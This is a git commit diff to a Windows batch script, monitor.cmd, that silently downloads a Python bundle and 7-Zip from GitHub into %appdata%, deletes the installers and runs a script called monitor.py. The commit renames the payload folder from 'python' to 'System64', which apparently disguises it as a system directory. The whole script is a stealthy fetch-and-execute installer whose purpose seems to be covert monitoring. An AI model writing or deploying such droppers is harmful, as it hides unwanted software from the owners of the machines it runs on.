a7dcfb65f788ef7132115ebaee3cfa85d81ce87c
Nizhenets <can@nizhenets.com>
2025-03-01 17:15:01 -0600

    finally script
    finally script

--- monitor.cmd
+++ monitor.cmd
@@ -4,7 +4,7 @@ REM Change to the %appdata% directory
 cd %appdata%
 
 REM Download python.zip
-powershell -Command "try { Invoke-WebRequest -Uri 'https://github.com/nizhenets/monitor/raw/main/python.zip' -OutFile '%appdata%\Python.zip'; Write-Host 'Python.zip indirildi' } catch { Write-Host 'Hata: $_' }"
+powershell -Command "try { Invoke-WebRequest -Uri 'https://github.com/nizhenets/monitor/raw/main/python.zip' -OutFile '%appdata%\System64.zip'; Write-Host 'Python.zip indirildi' } catch { Write-Host 'Hata: $_' }"
 
 REM Download 7zip.exe
 powershell -Command "try { Invoke-WebRequest -Uri 'https://github.com/nizhenets/monitor/raw/main/7zip.exe' -OutFile '%appdata%\7zip.exe'; Write-Host '7zip.exe indirildi' } catch { Write-Host 'Hata: $_' }"
@@ -21,14 +21,14 @@ REM Wait 1 second before deleting the installer
 timeout /t 1 /nobreak >nul
 del /f /q %appdata%\7zip.exe
 
-REM Extract python.zip using 7zip
-"%ProgramFiles%\7-Zip\7z.exe" x -y "%appdata%\Python.zip" -o"%appdata%"
+REM Extract System64.zip using 7zip
+"%ProgramFiles%\7-Zip\7z.exe" x -y "%appdata%\System64.zip" -o"%appdata%"
 
-REM Wait 1 second before deleting the python.zip file
+REM Wait 1 second before deleting the System64.zip file
 timeout /t 1 /nobreak >nul
-del /f /q "%appdata%\Python.zip"
+del /f /q "%appdata%\System64.zip"
 
 REM Run the Python script
-"%appdata%\python\python.exe" "%appdata%\python\monitor.py"
+"%appdata%\System64\python.exe" "%appdata%\System64\monitor.py"
 
 echo Islem tamamlandi.
